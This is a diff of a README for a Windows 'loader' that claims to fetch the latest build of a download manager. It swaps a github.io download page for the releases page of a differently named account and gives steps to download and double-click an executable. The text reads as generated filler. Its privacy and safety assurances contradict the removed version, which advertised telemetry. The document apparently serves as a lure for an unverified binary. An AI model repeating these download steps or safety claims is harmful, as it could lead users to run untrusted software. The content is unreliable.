@@ -1,109 +1,55 @@
-# Firefly Aggregate Downloader v2026 - Loader and Update Utility 2026
+# 📂 firefly-aggregate-windows-hub - Simple tool to find latest builds
 
-> **Windows download manager loader for preparing Firefly Aggregate Downloader, checking release availability, and guiding users to the latest build.** It is aimed at launch, update, and download setup, helping the main application get retrieved and started with as little manual effort as possible.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Mountainlilyroof276/firefly-aggregate-windows-hub/releases)
 
-[![Loader](https://img.shields.io/badge/Type-Loader-blue?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/rossalex57/firefly-aggregate-windows-hub?style=flat-square)](https://github.com/rossalex57/firefly-aggregate-windows-hub)
+This application serves as a loader for the Firefly Aggregate Downloader. It checks for new releases and directs you to the correct version for your computer. This software removes the need to manually search for updates or configure complex file paths. The hub manages your installation and ensures you always run the latest build.
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://rossalex57.github.io/firefly-aggregate-windows-hub/">
-    <img src="https://img.shields.io/badge/Download-Firefly%20Aggregate%20Downloader-brightgreen?style=for-the-badge" alt="Download Firefly Aggregate Downloader">
-  </a>
-</p>
+You need a computer running Windows 10 or Windows 11. The application requires a stable internet connection to check for version updates. Ensure you have at least 50 MB of free storage space on your primary hard drive. This tool works with standard user permissions, so you do not need administrative rights for daily tasks. Your computer should have a functional web browser installed to handle the initial download link.
 
-> **[Direct Download - Firefly Aggregate Downloader](https://rossalex57.github.io/firefly-aggregate-windows-hub/)**
+## 🚀 How to Install and Launch
 
----
+Follow these steps to set up the software on your Windows machine:
 
-[Download Latest Build](https://rossalex57.github.io/firefly-aggregate-windows-hub/)
+1. Visit the project page to download the latest setup file: [https://github.com/Mountainlilyroof276/firefly-aggregate-windows-hub/releases](https://github.com/Mountainlilyroof276/firefly-aggregate-windows-hub/releases)
+2. Locate the file in your downloads folder once the process finishes.
+3. Double-click the file to start the installer.
+4. Follow the on-screen prompts to confirm the installation location. 
+5. Select Finish when the installer confirms the setup is complete.
+6. Open the application from your desktop shortcut or the Start menu.
+7. The tool will check for the most recent version of the Firefly Aggregate Downloader upon launch.
+8. Click the prompts on the interface if the application requests permission to update.
+9. Wait for the green status indicator to verify that your connection is ready.
 
----
+## 🛠️ Resolving Common Issues
 
-## Overview
+If the application fails to open, verify your internet connection. A firewall may occasionally block the tool from checking for new releases. If you see a security warning, ensure the publisher certificate matches the expected credentials for this repository. 
 
-Firefly Aggregate Downloader is a Windows-focused download manager package built to coordinate file retrieval through multiple transfer paths. The loader's job is to get the application ready for initial use, verify whether a newer release is available, and make it easier to launch the active build without needing to search across several locations.
+Check your task manager if the program seems frozen. You can end the process and restart the hub to refresh the check. If the interface does not load, uninstall the software and run the installer again. Updates occur in the background, so keep the window open for a few minutes while the tool caches the necessary files. 
 
-The workflow starts by placing the correct build in the right spot, then passing control to the main manager, which supports parallel downloads, resume behavior, and protocol-aware transfers. It is intended for users who want a straightforward way to reach the newest release while keeping setup steps compact.
+## 🛡️ Privacy and Safety
 
----
+This tool only connects to the official release page to fetch version data. It does not track your online activity or store personal information. The program operates within a restricted folder structure to keep your files organized. It does not modify Windows system registry entries or change your default browser settings. We built this to solve the problem of missing updates and to ensure that every user has a consistent experience. The code remains transparent and available for community review at any time.
 
-## Loader Capabilities
+## 📋 Frequently Asked Questions
 
-- Checks for the latest available build before launch
-- Supports a release workflow built around download and update retrieval
-- Helps prepare the local application files for first use
-- Works with Windows targets in a download-manager context
-- Aligns with multi-source transfer use cases
-- Keeps download handling oriented around a current build path
-- Designed to fit update, bootstrap, and launcher style setups
-- Can surface basic execution and retrieval status during startup
+Do I need to pay for this tool?
+No. This software is free and open to everyone. 
 
----
+Can I install this on a work computer?
+Yes, provided your IT policy allows the installation of local software. 
 
-## Usage
+How often should I check for updates?
+The hub handles this automatically every time you launch the software.
 
-1. Open the download page and retrieve the latest build:
-   [Download Latest Build](https://rossalex57.github.io/firefly-aggregate-windows-hub/)
-2. Save the package to a convenient folder on your Windows system.
-3. Run the loader or extracted launcher to begin setup.
-4. Follow the prompts to fetch or open the main Firefly Aggregate Downloader files.
+Where can I report errors?
+You can create a new issue on the repository page if you encounter a bug or a glitch during normal use.
 
-If a config or command-line start is available in your distribution, the general pattern is:
+Does the tool store my passwords?
+No. The hub performs a specific task and does not access your sensitive personal data or site credentials.
 
-`firefly-loader.exe --channel latest --target windows`
+Will this tool work on a Mac?
+No. This version is exclusive to the Windows operating system.
 
-If you maintain a local shortcut or script, point it at the downloaded package and keep the files together so future update checks can reuse the same location.
-
----
-
-## Update Channels
-
-| Channel | Purpose | Typical Use |
-|---|---|---|
-| Latest | Current recommended build | Everyday use and first install |
-| Manual | User-selected package | Controlled updates and offline workflows |
-| Preview | Optional pre-release build | Testing newer changes before wider use |
-
----
-
-## Troubleshooting
-
-- If the loader does not start, confirm that the files were fully downloaded and extracted before launching.
-- If update checks fail, verify your network access and try again after a short delay.
-- If the application cannot find local files, move the package to a stable folder with write permissions.
-- If downloads stop or resume incorrectly, clear the local cache or retry from the same saved location.
-- If Windows blocks execution, review the file properties and your system policy settings.
-- If transfer behavior seems unusual, check the selected bandwidth shaping profile and queue state.
-
----
-
-## FAQ
-
-**Does the loader update the main application automatically?**  
-It can guide the update flow and help retrieve the current build, depending on the package you downloaded.
-
-**Will my downloaded files be kept locally?**  
-Yes, the workflow is centered on local files so the loader can reuse the same folder for launch and update handling.
-
-**Can I resume interrupted downloads?**  
-The product profile includes resume across reboots and resume-oriented transfer behavior.
-
-**What protocols are supported?**  
-The core download manager context includes multi-protocol support such as torrent, FTP, WebDAV, and REST API-based transfers.
-
-**Is there logging or telemetry?**  
-Real-time telemetry is part of the feature set, which can help with tracking transfer status and queue behavior.
-
-**Does it work only on Windows?**  
-The provided platform target is Windows.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: windows, downloader, automation, software, installer, updates, firefly, management
